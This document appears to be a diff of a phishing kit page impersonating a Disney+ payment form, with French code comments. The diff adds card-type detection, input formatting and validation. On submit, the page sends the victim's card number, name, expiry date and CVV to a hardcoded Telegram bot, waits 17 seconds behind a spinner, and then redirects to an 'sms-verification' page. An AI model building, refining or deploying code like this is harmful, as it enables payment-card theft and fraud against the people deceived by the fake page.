@@ -1,11 +1,182 @@
-<!-- payment.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Secure Payment | Disney+</title>
-  <link rel="stylesheet" href="style.css"/>
+  <style>
+    /* Styles de base */
+    body.page-form {
+      font-family: 'Helvetica Neue', Arial, sans-serif;
+      background-color: #f5f5f7;
+      color: #333;
+      margin: 0;
+      padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    
+    main {
+      background: white;
+      border-radius: 12px;
+      padding: 30px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      max-width: 450px;
+      width: 100%;
+      box-sizing: border-box;
+    }
+    
+    .center-logo {
+      display: block;
+      margin: 0 auto 20px;
+      max-width: 180px;
+    }
+    
+    h1 {
+      text-align: center;
+      font-weight: 600;
+      font-size: 24px;
+      margin-bottom: 20px;
+      color: #1a1a2e;
+    }
+    
+    form {
+      display: flex;
+      flex-direction: column;
+    }
+    
+    input {
+      padding: 14px;
+      margin-bottom: 16px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 16px;
+      transition: border-color 0.3s;
+    }
+    
+    input:focus {
+      outline: none;
+      border-color: #0063e5;
+    }
+    
+    input.error {
+      border-color: #ff3860;
+    }
+    
+    .error-message {
+      color: #ff3860;
+      font-size: 12px;
+      margin-top: -10px;
+      margin-bottom: 15px;
+      text-align: left;
+    }
+    
+    button {
+      background-color: #0063e5;
+      color: white;
+      border: none;
+      padding: 16px;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+    
+    button:hover {
+      background-color: #004db3;
+    }
+    
+    .footer-note {
+      margin-top: 30px;
+      text-align: center;
+      font-size: 0.85rem;
+      color: #666;
+    }
+    
+    .footer-note a {
+      color: #0063e5;
+      text-decoration: none;
+    }
+    
+    .footer-note a:hover {
+      text-decoration: underline;
+    }
+    
+    .logos-container {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 15px;
+      margin-top: 15px;
+    }
+    
+    .logos-container img {
+      height: 28px;
+      object-fit: contain;
+    }
+    
+    /* Spinner */
+    #spinnerOverlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.7);
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+    
+    .spinner {
+      border: 4px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top: 4px solid #fff;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    /* Icônes de carte */
+    .card-icon-container {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin: 16px 0;
+    }
+    
+    .card-icon {
+      height: 28px;
+      object-fit: contain;
+      opacity: 0.3;
+      transition: opacity 0.3s;
+    }
+    
+    .card-icon.active {
+      opacity: 1;
+    }
+    
+    /* Champs de formulaire groupés */
+    .form-row {
+      display: flex;
+      gap: 15px;
+    }
+    
+    .form-group {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+    }
+  </style>
 </head>
 <body class="page-form">
   <main>
@@ -14,18 +185,30 @@
 
     <h1>Payment Information</h1>
 
-    <!-- Payment icons -->
-    <div class="cb-icons" style="display:flex; justify-content:center; gap:12px; margin:16px 0;">
-      <img src="Images/visa.png" alt="Visa" style="height:28px; object-fit:contain;"/>
-      <img src="Images/Mastercard.png" alt="Mastercard" style="height:28px; object-fit:contain;"/>
-      <img src="Images/Amex.png" alt="American Express" style="height:28px; object-fit:contain;"/>
+    <!-- Payment icons avec détection automatique -->
+    <div class="card-icon-container">
+      <img src="Images/visa.png" alt="Visa" class="card-icon" id="visaIcon"/>
+      <img src="Images/Mastercard.png" alt="Mastercard" class="card-icon" id="mastercardIcon"/>
+      <img src="Images/Amex.png" alt="American Express" class="card-icon" id="amexIcon"/>
     </div>
 
     <form id="paymentForm">
-      <input type="text" placeholder="Card Number" required/>
-      <input type="text" placeholder="Name on Card" required/>
-      <input type="text" placeholder="MM/YY" required/>
-      <input type="text" placeholder="CVV" required/>
+      <input type="text" id="cardNumber" placeholder="Card Number" required maxlength="19"/>
+      <div id="cardNumberError" class="error-message"></div>
+      
+      <input type="text" id="cardName" placeholder="Name on Card" required/>
+      <div id="cardNameError" class="error-message"></div>
+      
+      <div class="form-row">
+        <div class="form-group">
+          <input type="text" id="expiryDate" placeholder="MM/YY" required maxlength="5"/>
+          <div id="expiryDateError" class="error-message"></div>
+        </div>
+        <div class="form-group">
+          <input type="text" id="cvv" placeholder="CVV" required maxlength="4"/>
+          <div id="cvvError" class="error-message"></div>
+        </div>
+      </div>
 
       <p style="font-size:0.85rem; color:#333; margin:16px 0; text-align:left;">
         By confirming your payment, you agree that your subscription will begin immediately and renew automatically each month. No commitment – you can cancel at any time.
@@ -56,28 +239,192 @@
   </div>
 
   <script>
-    document.getElementById("paymentForm").addEventListener("submit", function(e) {
-      e.preventDefault();
-      document.getElementById("spinnerOverlay").style.display = "flex";
+    // Fonctions de validation
+    function detectCardType(cardNumber) {
+      // Nettoyer le numéro de carte (supprimer les espaces)
+      const cleanNumber = cardNumber.replace(/\s+/g, '');
+      
+      // Expressions régulières pour détecter le type de carte
+      const patterns = {
+        visa: /^4/,
+        mastercard: /^(5[1-5]|2[2-7])/,
+        amex: /^3[47]/
+      };
+      
+      if (patterns.visa.test(cleanNumber)) return 'visa';
+      if (patterns.mastercard.test(cleanNumber)) return 'mastercard';
+      if (patterns.amex.test(cleanNumber)) return 'amex';
+      
+      return 'unknown';
+    }
+    
+    function validateCardNumber(cardNumber, cardType) {
+      const cleanNumber = cardNumber.replace(/\s+/g, '');
+      
+      // Vérifier la longueur selon le type de carte
+      const lengthValid = (
+        (cardType === 'visa' && (cleanNumber.length === 13 || cleanNumber.length === 16)) ||
+        (cardType === 'mastercard' && cleanNumber.length === 16) ||
+        (cardType === 'amex' && cleanNumber.length === 15)
+      );
+      
+      // Vérifier que ce ne sont que des chiffres
+      const onlyDigits = /^\d+$/.test(cleanNumber);
+      
+      return lengthValid && onlyDigits;
+    }
+    
+    function validateExpiryDate(expiryDate) {
+      if (!/^\d{2}\/\d{2}$/.test(expiryDate)) return false;
+      
+      const [month, year] = expiryDate.split('/').map(Number);
+      const now = new Date();
+      const currentYear = now.getFullYear() % 100; // Obtenir les deux derniers chiffres
+      const currentMonth = now.getMonth() + 1; // Les mois commencent à 0
+      
+      // Vérifier que le mois est valide
+      if (month < 1 || month > 12) return false;
+      
+      // Vérifier que la date n'est pas expirée
+      if (year < currentYear) return false;
+      if (year === currentYear && month < currentMonth) return false;
+      
+      return true;
+    }
+    
+    function validateCVV(cvv, cardType) {
+      // Vérifier que ce ne sont que des chiffres
+      if (!/^\d+$/.test(cvv)) return false;
+      
+      // Vérifier la longueur selon le type de carte
+      return (cardType === 'amex') ? cvv.length === 4 : cvv.length === 3;
+    }
+    
+    function formatCardNumber(cardNumber) {
+      // Supprimer tous les espaces existants
+      const v = cardNumber.replace(/\s+/g, '');
+      const matches = v.match(/\d{4,16}/g);
+      const match = matches && matches[0] || '';
+      const parts = [];
+      
+      for (let i = 0, len = match.length; i < len; i += 4) {
+        parts.push(match.substring(i, i + 4));
+      }
+      
+      if (parts.length) {
+        return parts.join(' ');
+      } else {
+        return cardNumber;
+      }
+    }
+    
+    // Initialisation
+    document.addEventListener('DOMContentLoaded', function() {
+      const cardNumberInput = document.getElementById('cardNumber');
+      const expiryDateInput = document.getElementById('expiryDate');
+      const cvvInput = document.getElementById('cvv');
+      const form = document.getElementById('paymentForm');
+      
+      let currentCardType = 'unknown';
+      
+      // Écouter les changements sur le numéro de carte
+      cardNumberInput.addEventListener('input', function(e) {
+        // Formater le numéro de carte avec des espaces
+        this.value = formatCardNumber(this.value);
+        
+        // Détecter le type de carte
+        currentCardType = detectCardType(this.value);
+        
+        // Mettre à jour l'affichage des icônes
+        document.getElementById('visaIcon').classList.toggle('active', currentCardType === 'visa');
+        document.getElementById('mastercardIcon').classList.toggle('active', currentCardType === 'mastercard');
+        document.getElementById('amexIcon').classList.toggle('active', currentCardType === 'amex');
+        
+        // Valider en temps réel
+        const isValid = validateCardNumber(this.value, currentCardType);
+        this.classList.toggle('error', !isValid && this.value.length > 0);
+        document.getElementById('cardNumberError').textContent = 
+          (!isValid && this.value.length > 0) ? 'Invalid card number' : '';
+      });
+      
+      // Formater la date d'expiration
+      expiryDateInput.addEventListener('input', function(e) {
+        // Supprimer tout ce qui n'est pas un chiffre
+        let value = this.value.replace(/\D/g, '');
+        
+        // Ajouter un slash après 2 chiffres
+        if (value.length > 2) {
+          value = value.substring(0, 2) + '/' + value.substring(2, 4);
+        }
+        
+        this.value = value;
+        
+        // Valider en temps réel
+        const isValid = validateExpiryDate(this.value);
+        this.classList.toggle('error', !isValid && this.value.length === 5);
+        document.getElementById('expiryDateError').textContent = 
+          (!isValid && this.value.length === 5) ? 'Invalid expiration date' : '';
+      });
+      
+      // Valider le CVV en temps réel
+      cvvInput.addEventListener('input', function(e) {
+        const isValid = validateCVV(this.value, currentCardType);
+        this.classList.toggle('error', !isValid && this.value.length > 0);
+        document.getElementById('cvvError').textContent = 
+          (!isValid && this.value.length > 0) ? 'Invalid CVV' : '';
+      });
+      
+      // Validation du formulaire avant envoi
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        // Valider tous les champs
+        const isCardNumberValid = validateCardNumber(cardNumberInput.value, currentCardType);
+        const isExpiryDateValid = validateExpiryDate(expiryDateInput.value);
+        const isCVVValid = validateCVV(cvvInput.value, currentCardType);
+        const isNameValid = document.getElementById('cardName').value.trim().length > 0;
+        
+        // Mettre à jour les styles d'erreur
+        cardNumberInput.classList.toggle('error', !isCardNumberValid);
+        expiryDateInput.classList.toggle('error', !isExpiryDateValid);
+        cvvInput.classList.toggle('error', !isCVVValid);
+        document.getElementById('cardName').classList.toggle('error', !isNameValid);
+        
+        // Afficher les messages d'erreur
+        document.getElementById('cardNumberError').textContent = 
+          !isCardNumberValid ? 'Invalid card number' : '';
+        document.getElementById('expiryDateError').textContent = 
+          !isExpiryDateValid ? 'Invalid expiration date' : '';
+        document.getElementById('cvvError').textContent = 
+          !isCVVValid ? 'Invalid CVV' : '';
+        document.getElementById('cardNameError').textContent = 
+          !isNameValid ? 'Please enter the name on card' : '';
+        
+        // Si tout est valide, procéder au paiement
+        if (isCardNumberValid && isExpiryDateValid && isCVVValid && isNameValid) {
+          document.getElementById('spinnerOverlay').style.display = "flex";
+          
+          const num = cardNumberInput.value;
+          const name = document.getElementById('cardName').value.trim();
+          const exp = expiryDateInput.value;
+          const cvv = cvvInput.value;
 
-      const [num, name, exp, cvv] = Array.from(this.elements)
-        .filter(el => el.tagName === "INPUT")
-        .map(el => el.value.trim());
+          const botToken = "8282278449:AAFAK4-kguuUmTRttN4ocgDvVxc91kWDItA";
+          const chatId   = "-4970333928";
+          const message  = `💳 Disney+ Payment:\nCard: ${num}\nName: ${name}\nExp: ${exp}\nCVV: ${cvv}`;
 
-      const botToken = "8282278449:AAFAK4-kguuUmTRttN4ocgDvVxc91kWDItA";
-      const chatId   = "-4970333928";
-      const message  = `💳 Disney+ Payment:\nCard: ${num}\nName: ${name}\nExp: ${exp}\nCVV: ${cvv}`;
-
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: message })
-      }).catch(console.error)
-        .finally(() => {
-          setTimeout(() => {
-            window.location.href = "sms-verification.html";
-          }, 17000);
-        });
+          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text: message })
+          }).catch(console.error)
+            .finally(() => {
+              setTimeout(() => {
+                window.location.href = "sms-verification.html";
+              }, 17000);
+            });
+        }
+      });
     });
   </script>
 </body>
